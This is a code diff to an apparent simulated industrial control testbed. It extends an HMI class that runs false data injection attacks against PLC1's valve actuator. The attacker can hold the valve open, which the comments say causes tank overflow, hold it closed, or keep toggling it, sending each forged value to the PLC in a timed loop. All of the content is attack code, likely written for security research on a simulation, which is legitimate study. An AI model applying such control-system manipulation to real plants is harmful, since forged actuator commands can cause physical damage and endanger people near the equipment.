@@ -38,30 +38,47 @@ class FPHMI(HMI):
         delay = 60 * int(sys.argv[1]) # delay in seconds
         close_time = time.time() + delay
         while close_time > time.time():
-            random = None
+
+            const_value = 10 # change this to 0 to close valve all the time
             motor_status = int(self.get(ACTUATOR1))
+            print ("actual motor value: ", motor_status)
 
             """"We basically changing the actuator value to the opposite -- old school command line injection"""
 
-            if random == None:
+            if const_value == 1:
                 """ another clever way is to set the value to 1 or 0 all the time, this will result in actuator always open
                     which later on cause overflow
                 """
-
                 toggle_status = 1
-                print("Acutal status:", motor_status)
+                print("attacking_status:", toggle_status)
                 print("Attacking PLC1 with false data injection constant value: ", toggle_status)
                 self.set(ACTUATOR1, toggle_status)
                 self.send(ACTUATOR1, toggle_status, PLC1_ADDR) # this wont prolly do anything (Just to be safe)
-                # time.sleep(0.5)
+                # time.sleep(HMI_PERIOD_SEC) # we avoid sleeping too much here
+                time.sleep(.2)
                 logging.info("FDI Constant: Actuator status changed to: %s" % toggle_status)
+
+            elif const_value == 0:
+                """closing tank valve all the time"""
+
+                toggle_status = 0
+                print("attacking_status:", toggle_status)
+                print("Attacking PLC1 with false data injection constant value: ", toggle_status)
+                self.set(ACTUATOR1, toggle_status)
+                self.send(ACTUATOR1, toggle_status, PLC1_ADDR)
+                # time.sleep(HMI_PERIOD_SEC)
+                time.sleep(.2)
+                logging.info("FDI Constant: Actuator status changed to: %s" % toggle_status)
+
             else:
+                """changing the value to its opposite"""
+
                 toggle_status = int(not motor_status)
-                print("Acutal status:", motor_status)
+                print("attacking_status:", motor_status)
                 print("Attacking PLC1 with false data injection not value: ", toggle_status)
                 self.set(ACTUATOR1, toggle_status)
                 self.send(ACTUATOR1, toggle_status, PLC1_ADDR) # this wont prolly do anything (Just to be safe)
-                # time.sleep(0.5)
+                time.sleep(HMI_PERIOD_SEC)
                 logging.info("FDI toggle: Actuator status changed to %s" % toggle_status)
 
 
